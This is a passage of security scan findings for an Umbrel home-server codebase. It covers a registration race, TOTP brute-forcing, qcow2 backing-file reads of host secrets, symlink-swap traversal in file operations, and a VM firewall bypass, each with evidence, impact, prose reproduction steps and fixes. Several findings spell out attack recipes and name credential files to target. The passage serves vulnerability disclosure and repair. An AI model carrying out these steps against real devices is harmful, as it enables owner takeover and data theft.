   register() checks exists() then writes name, language, widgets, notification and password with no lock; exists() flips true only after setName's store write. The loser of the race throws 'Attempted to register when user is already registered', so the legitimate post-boot registration fails permanently.
8. [packages/umbreld/source/modules/hardware/raid.ts:1136–1143](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1136-L1143)
   The pre-reboot side keeps isInitialSetupInProgress set so 'registration cannot start setup again in the gap' between the response and reboot (covered by raid-initial-setup-lock.vm.test.ts). The maintainers closed the registration gap before reboot but not the one after it.

## Impact
Integrity: attacker becomes device owner with full owner-tier control and host shell, and the victim's chosen credentials are discarded. Availability: the legitimate owner is locked out of their freshly set up device until a physical reset/reflash. Confidentiality: the new pool holds little data yet, but the owner session exposes device secrets (CA key, system token) and any data the victim subsequently adds if they do not notice; rated low.

## Reproduction steps
1. Attacker is a network peer reaching the dashboard who knows (or observes via user.exists polling) that a RAID onboarding reboot is happening. They loop user.register during the reboot; the first call accepted after the API comes up, before handlePostBootRaidSetupProcess's setName lands, wins. No credentials or user interaction; success depends on winning a sub-second to few-second race against umbreld's own startup, hence attack requirements present.

## Recommended fix
The pending owner recorded on the config partition is not honoured by the registration gate: user.register treats an empty store as 'no owner' even while handlePostBootRaidSetupProcess has not yet applied the saved credentials. Fix criteria: While the config partition holds a pending user (or a RAID install is configured), user.register must reject network registrations, or the saved owner must be created before the tRPC server starts accepting requests (sequence handlePostBootRaidSetupProcess ahead of server.start/lanIngress exposure). Verify: hammering user.register across a RAID onboarding reboot never succeeds and the config-partition credentials always become the owner.

---
**Severity:** HIGH
**Status:** Open
**Category:** Race Condition
**CWE:** [CWE-362](https://cwe.mitre.org/data/definitions/362.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257928

---

# TOTP verification accepts codes from ±10 time steps (±5 minutes), 21 valid codes per login attempt

## Details
utilities/totp.ts verify() passes {window: 10, time: period} to notp's totp.verify (notp ^2.0.3). Assuming notp's documented semantics, `window` is the number of time steps checked in each direction, so with the 30-second period generated by generateUri the server accepts the 21 codes for t-5min..t+5min at any instant. RFC 6238 recommends at most one step of skew either side (3 codes); the project explicitly widened notp's default of 6 to 10, raising the per-guess success probability from 3/10^6 to 21/10^6.

The only consumer is User.validateAccountLogin (user.ts:449-462), reached from three unauthenticated entry points: the tRPC publicProcedures user.login and user.loginNative (user/routes.ts:103-179, dashboard ports 80/443) and POST /v1/account/login on the app-auth port (server/app-auth.ts:151-164). None of them, and nothing else in umbreld, counts failed attempts, locks the account or adds delay (no limiter dependency in package.json; no throttling middleware in server/, lan-ingress/ or app-gateway/). An attacker who already knows an account's password (reuse, phishing, shoulder-surfing) and is stopped only by the second factor can therefore guess the 6-digit code online. Each attempt costs one bcrypt.compare at cost 12 plus an HMAC loop; with 21 valid codes the expected number of guesses to even odds is about 33,000 (roughly an hour at 10 req/s; bcrypt runs on the libuv threadpool so several compares proceed in parallel) versus about 230,000 with a one-step window. Because the window rolls with time, continuous guessing never loses accepted codes. The owner account (userId '0') and member accounts are both exposed.

The wide window also lets a code observed over the shoulder, in a screenshot or from a notification be replayed for up to five minutes after it was displayed, and nothing rejects reuse of an already-accepted code.

## Evidence
1. [packages/umbreld/source/modules/utilities/totp.ts:20](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/utilities/totp.ts#L20)
   verify() calls notp's totp.verify with {window: 10}. In notp (^2.0.3 per packages/umbreld/package.json; dependency not present in the checkout, behaviour stated as an assumption) `window` is the number of 30-second steps checked on each side of the current one, so 21 distinct 6-digit codes are simultaneously valid (t-5min..t+5min); notp's own default is 6, the project widened it to 10.
2. [packages/umbreld/source/modules/user/user.ts:449–461](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/user.ts#L449-L461)
   validateAccountLogin is the single authentication check for every login entry point: bcrypt.compare (cost 12, user.ts:107) then totp.verify. There is no per-account or per-source attempt counter, lockout or progressive delay here or anywhere else in umbreld (no limiter dependency in package.json, no throttling middleware in server/, lan-ingress/ or app-gateway/).
3. [packages/umbreld/source/modules/user/routes.ts:103–178](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L103-L178)
   user.login and user.loginNative are publicProcedure mutations reachable over the dashboard ports (80/443 via lan-ingress -> umbreld); each call runs validateAccountLogin with a caller-chosen userId, password and totpToken and returns a full session on success.
4. [packages/umbreld/source/modules/server/app-auth.ts:151–163](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/app-auth.ts#L151-L163)
   Third unauthenticated entry: POST /v1/account/login on the app-auth port (2000) calls the same validateAccountLogin with body-supplied credentials and issues an app-gateway session; also unthrottled.

## Impact
A successful guess defeats the second factor the owner enabled precisely for the compromised-password case and yields a full owner (or member) session: read of all data, control of apps, files, VMs and system settings, and the ability to shut down or factory reset the device.

## Reproduction steps
1. A network peer who can reach the dashboard (80/443) or app-auth (2000) port and already holds the account password submits login requests with guessed 6-digit codes. The routes are public, the check is unthrottled, and 21 codes are valid at any instant (assumption: notp ^2.0.3 treats `window` as +/- steps, which is its documented contract), so roughly 33k attempts reach even odds. Knowing the password is a precondition outside the attacker's control (AT PRESENT); success is probabilistic and takes sustained traffic rather than a single request (AC HIGH).

## Recommended fix
1. Failed password/TOTP attempts against validateAccountLogin are never counted, delayed or locked out on any of the three public login entry points, so a 6-digit second factor can be guessed online. Fix criteria: Repeated failed logins for an account (and/or from a source) must trigger progressive delay or temporary lockout such that the expected number of online TOTP guesses cannot be reached in practical time; verify by scripting repeated failed attempts against user.login, user.loginNative and app-auth /v1/account/login and observing throttling on each.
2. The TOTP acceptance window is ten steps in each direction, multiplying the number of simultaneously valid codes and the replay lifetime of an observed code. Fix criteria: Accept at most one step of clock skew either side (window <= 1) and reject reuse of a code already accepted in the current window. Verify that a code generated for t +/- 60s or later is rejected and that the same code cannot be used twice.

---
**Severity:** HIGH
**Status:** Open
**Category:** Weak Authentication
**CWE:** [CWE-307](https://cwe.mitre.org/data/definitions/307.html)
**Attack vector:** NETWORK
**Attack complexity:** HIGH
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257927

---

# VM disks on External/Network storage trusted as qcow2; embedded backing/data-file paths reach host files

## Details
Machines lets a machine's virtual disk live outside the Umbrel data directory: `create()` accepts `diskDirectory` under `/External/` or `/Network/` and persists `definition.diskPath` (machines.ts 2127-2141, 2243-2245; machine-store.ts only requires that prefix and a `.qcow2` suffix). On every start — including unattended autostart at boot (machines.ts 1033-1037) — `#diskSystemPath` resolves that virtual path and `startMachine` hands it to `Libvirt.start`, which bind-mounts the file into the runtime directory and emits domain XML with `<driver name='qemu' type='qcow2'/>`, `<seclabel type='dynamic' model='apparmor' relabel='yes'/>` and no `<backingStore/>` (libvirt.ts 654-677, domain.ts 253-260). Nothing inspects the qcow2 header before libvirt/QEMU open it.

That storage is written by parties other than umbreld: `/Network/*` is a cifs mount of a remote SMB server (network-storage.ts 154), and the owner can grant member accounts read-write access to the entire `/External` or `/Network` category (member-shares.ts 15, 201-203) or export an `/External/<drive>/<folder>` over Samba. Whoever can write `<id>.qcow2` there already controls the guest OS (conceded by the design) but also controls the qcow2 metadata. A qcow2 header carries a `backing_file` path (plus `backing_fmt`, and with the external-data-file feature a `data_file` path). Because the domain XML gives no `<backingStore>`, libvirt's qemu driver determines the chain by reading that header, treats the backing file as raw (either because `backing_fmt=raw` is set or because an unspecified format is assumed raw), DAC-relabels each chain member to the QEMU user (`dynamic_ownership`, the Debian default; nothing in packages/os/qemu-machines.conf changes it) and admits it to the domain's AppArmor profile (virt-aa-helper's restricted-prefix list covers /etc, /usr, /proc… but not /home/umbrel/umbrel), and QEMU serves the overlay's unallocated clusters from it. The attacker therefore builds an overlay whose allocated clusters hold their guest OS and whose backing file is e.g. `/home/umbrel/umbrel/secrets/auth/system-token` (plaintext, accepted by `#isSystemToken` as the owner-level 'system' principal), `/home/umbrel/umbrel/umbrel.yaml` (owner `hashedPassword`, `totpUri`, plaintext network-share passwords), another member's home, or another machine's `machines/<id>/disk.qcow2`; the attacker-controlled guest reads those bytes and exfiltrates them over the share or the NAT network. The chown of the referenced host file to libvirt-qemu is not reverted for non-top chain members.

The maintainers recognise this class for custom *source* images: machines.ts 857-860 states user-controlled images must not be able to follow backing files, data files or extents into the host filesystem, and convertDisk opens with an explicit input format and rejects `backing-filename` (libvirt.ts 878-887). That protection covers only the one-time import; the resulting disk, once on third-party-writable storage, is opened as qcow2 on every boot with no equivalent check. (`diskUsageBytes`/`diskVirtualSizeBytes` use `qemu-img info -f qcow2` and are not the exploitable step.)

Explicit dependency assumptions (image is Debian trixie, umbrelos.Dockerfile ARG DEBIAN_VERSION=trixie, libvirt 11.x / QEMU 10.x from Debian; none verifiable in this checkout): (1) libvirt probes the backing chain of a file-backed qcow2 disk when the XML has no `<backingStore>` and treats an undeclared backing format as raw — libvirt's documented domain-XML contract since 6.x; (2) the DAC driver relabels chain members and the AppArmor driver/virt-aa-helper add them to the profile; (3) the integrity escalation via `data_file` (guest writes landing in an arbitrary existing host file such as umbrel.yaml) requires libvirt's qcow2 data-file detection (added in 11.x) and is conditional; the confirmed integrity impact is owner-level takeover through the disclosed plaintext system token / credentials. Attack requirement: the owner has placed at least one machine's disk on External/Network storage the attacker can write — a first-class UI option, not a disabled control.

## Evidence
1. [packages/umbreld/source/modules/machines/libvirt.ts:654–677](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/libvirt.ts#L654-L677)
   Libvirt.start bind-mounts the externally stored <id>.qcow2 into the runtime directory, chowns it to libvirt-qemu and hands it to buildDomainXml. Nothing reads the qcow2 header first, so a backing_file (or data_file) path embedded by whoever wrote the file is passed through to libvirt/QEMU. This is where a pre-start image check belongs.
2. [packages/umbreld/source/modules/machines/domain.ts:255–260](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/domain.ts#L255-L260)
   The disk is declared <driver name='qemu' type='qcow2'/> with no <backingStore/> terminator (and relabel='yes' at line 253), so libvirt determines the backing chain by probing the image header and labels every chain member for QEMU.
3. [packages/umbreld/source/modules/machines/machines.ts:2335–2366](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L2335-L2366)
   startMachine only checks that the external disk exists (isFile via #externalDiskAvailable, line 1486-1493) and passes #diskSystemPath(definition) to Libvirt.start; it also sets autostart=true, and #activateLibvirt (lines 1033-1037) starts autostart machines on every boot without user action.
4. [packages/umbreld/source/modules/machines/machines.ts:1417–1420](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L1417-L1420)
   #diskSystemPath resolves definition.diskPath (an /External or /Network virtual path) to the real file given to QEMU, with no inspection of its contents.
5. [packages/umbreld/source/modules/machines/machines.ts:2127–2141](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L2127-L2141)
   create() lets the owner place the virtual disk under /External/ or /Network/ (UI: 'Virtual disk location'), storage umbreld does not exclusively control.
6. [packages/umbreld/source/modules/machines/machine-store.ts:32–42](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machine-store.ts#L32-L42)
   Persisted diskPath is validated only by /External|/Network prefix and .qcow2 suffix.
7. [packages/umbreld/source/modules/machines/machines.ts:857–860](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L857-L860)
   Maintainers' own rule: user-controlled images must not be opened in a way that follows backing files, data files or other references into the host filesystem.
8. [packages/umbreld/source/modules/machines/libvirt.ts:870–887](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/libvirt.ts#L870-L887)
   convertDisk enforces that rule only for the one-time import of a custom source image (explicit input format, rejects backing-filename); the resulting disk, once on third-party-writable storage, is opened as qcow2 on every boot with no equivalent check.
9. [packages/umbreld/source/modules/files/member-shares.ts:11–16](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/member-shares.ts#L11-L16)
   Owner can grant member accounts read-write access to the whole /External or /Network category (lines 201-203); such a member can overwrite any machine disk stored there.
10. [packages/umbreld/source/modules/files/network-storage.ts:154](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/network-storage.ts#L154)
   /Network is a cifs mount of a remote SMB server using stored credentials with no signing/sealing requirement; the server operator (or a LAN MITM) authors every byte of a disk stored there.
11. [packages/umbreld/source/modules/auth/auth.ts:186–187](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/auth/auth.ts#L186-L187)
   Concrete target: secrets/auth/system-token is a plaintext 0600 file whose value #isSystemToken (line 913-916) accepts as the 'system' principal mapped to the owner account; reading it through a backing_file reference yields owner-level API access.

## Impact
Backing-file variant discloses arbitrary host files outside virt-aa-helper's denied system prefixes: secrets/auth/system-token (plaintext; accepted as the owner-level 'system' principal), umbrel.yaml (owner password hash, TOTP secret, plaintext network-share passwords), other members' homes and other machines' disks (C:H). Possession of the system token gives owner-level control of umbreld, and the referenced host file is left chowned to libvirt-qemu (I:H; the data_file arbitrary-write variant is an additional, libvirt-version-conditional route). Breaking the machine itself is already conceded to a party who controls its disk, so no availability gain is attributed (A:N).

## Reproduction steps
1. The qcow2 header is authored by whoever can write the disk file on External/Network storage: the remote SMB server behind the /Network cifs mount (no umbrelOS credentials, PR:N), a member granted the read-write /External or /Network category share (PR:L), or a Samba client of an exported /External folder. They replace <id>.qcow2 with an overlay whose backing_file names a host path; on the next manual start or unattended autostart libvirt/QEMU follow it and the attacker's guest reads the host file. Requires the victim to have chosen the 'Virtual disk location' option onto storage the attacker can write (AT:PRESENT); no user interaction at exploit time since autostart runs at boot.

## Recommended fix
1. A disk image stored where third parties can write it is opened as qcow2 with its embedded backing_file/data_file references honoured, so attacker-controlled metadata selects host files for libvirt to relabel and QEMU to open. Fix criteria: Before every start of a machine whose disk is on External/Network storage, the image must be verified (e.g. `qemu-img info -f qcow2` without following the chain) to have no backing file, no external data file and no other external references, and the start must be refused otherwise; verify by crafting a qcow2 on the external location whose header names a host path — the machine must refuse to start and no host file may be relabelled or opened.
2. The generated domain XML lets libvirt derive the storage chain from image metadata instead of pinning it. Fix criteria: The domain XML for the machine disk must declare an explicit empty <backingStore/> terminator (and no data store) so libvirt never probes host paths from the image header; verify that a qcow2 with a backing_file set still starts with an empty chain or is rejected, and that the referenced host file's ownership is untouched.

---
**Severity:** HIGH
**Status:** Open
**Category:** Path traversal
**CWE:** [CWE-73](https://cwe.mitre.org/data/definitions/73.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257925

---

# Files copy/move/delete operate on unresolved paths after authorization, enabling root-level symlink-swap traversal

## Details
Every mutating primitive in files.ts follows the same shape: `systemPath = await virtualToSystemPath(virtualPath, userId)` (which verifies that the path's *current* realpath is inside the account's base and then returns the unresolved pathname), a series of advisory checks (`getAllowedOperations`, which uses the unsafe resolver and lstat only; `fse.stat`/`fse.lstat`; `getUniqueName`; `authorizeDestinationSystemPath`, which validates only the destination), and finally a pathname-based filesystem operation: fs-extra `move` (rename(2)) at files.ts:1236, `cp`/`rsync --archive` via #copyWithProgress at 1100, `fse.remove` at 1763. Nothing pins the authorised object; the kernel re-resolves every component at the final syscall.

A member account (provisioned by the owner via user.createUser, user/routes.ts:208; every files mutation route is `privateProcedureWithMembers` = accountProcedure, routes.ts:211-280, 323) can therefore route a root-privileged filesystem operation outside the virtual filesystem by swapping a parent directory between the check and the use, using only operations the module permits:
1. Upload an archive containing a symlink entry `D -> /home/umbrel/umbrel` and call `files.unarchive` on `/Users/<slug>/B.zip`; the symlink lands at `/Users/<slug>/B/D`.
2. Create a real `/Users/<slug>/A/D/secrets/` (dummy directory) with createDirectory.
3. Loop: call `files.move({path: '/Users/<slug>/P/D/secrets', toDirectory: '/Users/<slug>'})` while concurrently rotating names with `files.rename` so that `P` is sometimes `A` (real) and sometimes `B` (contains the symlink) (fs-extra move refuses an existing destination, so the rotation goes through a third name). Renaming `A`/`B`/`P` is allowed because each directory itself resolves inside the member's home and `/Users/<slug>/X` maps to the unprotected `/Home/X` rule path.
When the swap lands after `virtualToSystemPath(source)` but before the final `move()`, the intermediate checks all still pass (stat/lstat follow the swapped parent and find a real directory; dev matches because member homes `<data>/members/<slug>/home` and `<data>/secrets` share the data filesystem), and `rename("<data>/members/<slug>/home/P/D/secrets/", "<data>/members/<slug>/home/secrets")` moves the daemon's own `secrets` directory (auth.ts:172 `secrets/auth/sessions.yaml`, the session store) into the member's home where they can list and download it, and simultaneously removes it from the daemon. `copy` yields the same data via rsync without removing it; `delete`/`trash` with the swap pointed at `/etc` or `/home/umbrel/umbrel/app-data/<app>` removes arbitrary host directories as root (`fse.remove`). `umbrel.yaml` (owner password hash, network-share credentials) is reachable the same way as a file.

The window spans roughly ten awaited filesystem calls plus permission lookups, nothing serialises rename against move (the only PQueue is #trashClaimQueue for revision-claimed deletes), and attempts can be retried without limit, so it is practically winnable. The maintainers closed the read-side version of this gap for Photos with `openFileForRead` (files.ts:2239, O_NOFOLLOW + dev/ino re-check) but no equivalent exists for mutations. The read-only HTTP variant (/view, /download) is recorded separately as files-view-download-path-toctou-symlink-swap.

Assumptions (not verifiable in this checkout): Debian `unar` (installed by packages/os/umbrelos.Dockerfile:421) materialises symlink entries as symlinks — consistent with the project's own comment at api.ts:333; `fs-extra` ^11.1.1 `move()` performs rename(2) for same-device paths and only falls back to copy+remove on EXDEV (in which case the data is copied rather than relocated, still a full disclosure).

## Evidence
1. [packages/umbreld/source/modules/files/files.ts:1157–1237](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1157-L1237)
   move() authorises source and destination via virtualToSystemPath (realpath containment, returns the unresolved pathname), then performs ~10 more awaited calls (getAllowedOperations x2 which use the unsafe resolver and lstat only, fse.stat x2, fse.lstat, optional getUniqueName, authorizeDestinationSystemPath on the destination only) and finally at line 1236 calls fs-extra move() -> rename(2) on the unresolved sourceSystemPath. A parent component swapped to an escaping symlink in that window makes rename(2) relocate a host directory on the same device (e.g. <data>/secrets) into the member's home.
2. [packages/umbreld/source/modules/files/files.ts:1024–1100](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1024-L1100)
   copy() has the same shape; the eventual #copyWithProgress -> cp()/rsync on the pathname (line 1100) copies whatever the kernel now resolves into the requester's directory without re-validating the source.
3. [packages/umbreld/source/modules/files/files.ts:1727–1764](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1727-L1764)
   deleteOne() authorises with virtualToSystemPath then calls fse.remove(deletionSystemPath) on the pathname (line 1763); with a swapped parent this recursively removes an arbitrary host directory as root.
4. [packages/umbreld/source/modules/files/files.ts:2199–2232](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L2199-L2232)
   virtualToSystemPath checks realpath containment via assertSystemPathInsideBase but deliberately returns the as-passed path ('so we don't resolve symlinks in the path itself'); no mutation re-validates or pins the authorised object (no dirfd/O_NOFOLLOW-based operations), unlike openFileForRead (2239) which the maintainers added for the read side.
5. [packages/umbreld/source/modules/files/files.ts:1253–1286](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1253-L1286)
   rename() is the swap primitive: a member may rename directories inside their own home; a directory containing an escaping symlink passes authorisation because only the directory's own realpath is checked. getAllowedOperations maps /Users/<slug>/X to /Home/X which is unprotected.
6. [packages/umbreld/source/modules/files/archive.ts:195–223](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/archive.ts#L195-L223)
   unarchive() (member-capable, routes.ts:323) runs unar as root into the member's home with no post-extraction symlink sanitisation, letting a shell-less member plant an absolute symlink from an archive entry; api.ts:333 acknowledges 'Archive extraction can create symlinks'.

## Impact
Root-level filesystem operations are redirected to arbitrary host paths: moving/copying the daemon's secrets/auth session store and umbrel.yaml into the attacker's reach (confidentiality, leading to owner takeover and host root since umbreld runs as root), relocating or deleting arbitrary directories such as app data, /etc entries or the secrets store (integrity), and destroying state the daemon and apps depend on (availability).

## Reproduction steps
1. A member with a dashboard session (an in-scope adversary; member-capable routes are accountProcedure) plants an escaping symlink in their own home via archive extraction and then races their own tRPC move/copy/delete calls against rename calls that swap a parent directory. Everything is attacker-driven over the network and repeatable; success requires winning a check-to-syscall race spanning ~10 awaits (attack requirement), with no lockout, no serialisation between rename and move, and no owner involvement. Depends on unar creating symlink entries (stated as an assumption).

## Recommended fix
1. Mutations act on an unresolved pathname after a one-time realpath containment check, so the authorised object and the operated-on object can differ when a parent component changes. Fix criteria: Each mutation must act on the object it authorised: operate relative to a held directory descriptor (openat/renameat/unlinkat with O_NOFOLLOW on each component) or re-validate realpath immediately before and verify identity (dev/ino) immediately after, aborting on mismatch. Verify with a test hook that swaps a parent for an escaping symlink between authorisation and the syscall and confirm no file outside the base is read, moved or removed.
2. Archive extraction creates symlinks pointing outside the destination tree in user-writable directories, which is the precondition for parent-swap attacks. Fix criteria: No product surface may leave an escaping symlink inside a Files base directory: unarchive must strip, reject or re-target symlink entries that resolve outside the extraction directory. Verify by extracting an archive containing an absolute symlink and confirming it is absent or confined afterwards.

---
**Severity:** HIGH
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-367](https://cwe.mitre.org/data/definitions/367.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257924

---

# VM bridge gets blanket DOCKER-USER accept, exposing unpublished app container ports to guests

## Details
Libvirt.#reconcileFirewallUnlocked (packages/umbreld/source/modules/machines/libvirt.ts:357-363) inserts `iifname "umbrel-vm" counter accept comment "umbrel-machines"` at the top of Docker's `ip filter DOCKER-USER` chain. DOCKER-USER is the first jump from Docker's FORWARD base chain (policy DROP); in nftables an `accept` reached inside a jumped-to chain terminates the base chain, so for any packet arriving from the VM bridge Docker's DOCKER-FORWARD → DOCKER-BRIDGE → DOCKER chains — whose final `oifname br-* ! iifname br-* drop` is what confines inbound Docker-bridge traffic to published ports — are never evaluated. libvirt's own `libvirt_network` forward rules for the NAT network built by buildMachineNetworkXml (machine-network.ts:99-113, `<forward mode='nat'>`) accept any traffic sourced from 10.203.0.0/24 and masquerade it, with no destination restriction. The combination forwards every guest-originated packet to any destination the host routes, including the `umbrel_main_network` Docker bridge (10.21.0.0/16, apps/legacy-compat/docker-compose.yml) and every app container's unpublished ports; after masquerade the container sees the connection as coming from the host's bridge address.

In umbrelOS 2.0 the app_proxy sidecar is removed from each app's runtime compose (legacy-compat/app-script:464-467) and app login is enforced by umbreld's in-process app-gateway, which proxies to the backing container's Docker-network address. Backing containers (web UIs with PROXY_AUTH_ADD relying on the gateway, databases with manifest-fixed credentials, RPC daemons) publish no ports and are unreachable from the LAN only because Docker drops unpublished-port traffic. A VM guest therefore has strictly more network reach than a LAN peer: it can connect directly to `10.21.x.y:<port>` of any app container and use the app's UI/API/database with no login, bypassing the app-gateway boundary the threat model lists.

The rule is applied at Machines activation, machine create, every start and every port-forward update (machines.ts:1030, 2262, 2353, 2459) and re-asserted by Libvirt.ensureFirewall from the poller (machines.ts:1108) whenever fewer than three umbrel-machines rules are present, so it is in force whenever the Machines module is active and survives Docker restarts. Guest-to-guest traffic is rejected (`guest_cross` reject plus `<port isolated='yes'/>`) and `clean-traffic` prevents address spoofing, but nothing limits guest-to-container traffic. The rule's purpose is only to let guest NAT traffic out past Docker's FORWARD DROP; scoping it to the LAN/default-route interface (which the code already resolves via #lanInterface) or excluding Docker bridge subnets would preserve that without opening the app network.

Secondary consequence: an MCP token granted only `createMachines` or a machine grant (mcp/tools/machines.ts create_machine/control_machine) can drive a guest OS and, from inside it, reach app containers the token was never granted under `permissions.apps`.

## Evidence
1. [packages/umbreld/source/modules/machines/libvirt.ts:357–363](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/libvirt.ts#L357-L363)
   #reconcileFirewallUnlocked inserts `iifname "umbrel-vm" counter accept comment "umbrel-machines"` at the head of Docker's `ip filter DOCKER-USER` chain. DOCKER-USER is the first jump from Docker's FORWARD base chain (policy DROP); an nftables `accept` in a jumped-to chain terminates the base chain, so Docker's DOCKER-FORWARD/DOCKER-ISOLATION/DOCKER chains — which drop forwarded traffic to unpublished container ports — are never evaluated for packets arriving from the VM bridge. The rule is keyed only on the ingress interface, with no egress-interface or destination restriction.
2. [packages/umbreld/source/modules/machines/libvirt.ts:433–459](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/libvirt.ts#L433-L459)
   ensureFirewall, called from the Machines poller, re-runs #reconcileFirewallUnlocked whenever fewer than three umbrel-machines rules are present in DOCKER-USER (e.g. after a Docker restart), so the blanket accept is re-asserted within ~5 s for as long as the Machines module is active.
3. [packages/umbreld/source/modules/machines/machine-network.ts:99–112](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machine-network.ts#L99-L112)
   buildMachineNetworkXml defines the guest network as `<forward mode='nat'>` with no destination restriction. libvirt's nftables backend (enabled in umbrelos.Dockerfile) emits a `libvirt_network guest_output` rule accepting any forwarded traffic from the bridge's subnet and masquerades it, leaving Docker's FORWARD chain as the only control between guests and Docker bridge networks.
4. [packages/umbreld/source/modules/machines/machines.ts:2350–2354](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L2350-L2354)
   startMachine calls reconcileNetwork (and therefore #reconcileFirewallUnlocked) before every start; #activateLibvirt (line 1030), create (2262) and port-forward updates (2459) do the same, and #poll (1108) calls ensureFirewall, so the rule exists whenever a guest can be running.
5. [packages/umbreld/source/modules/apps/legacy-compat/app-script:464–467](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/legacy-compat/app-script#L464-L467)
   The app_proxy sidecar is deleted from every app's runtime compose; app authentication is now umbreld's in-process app-gateway on the host, which proxies to the backing container's Docker-network address (lan-ingress resolveAppTarget / app.ts getContainerIp). The backing containers therefore have no published ports and no authentication of their own beyond what Docker's unpublished-port DROP provides.
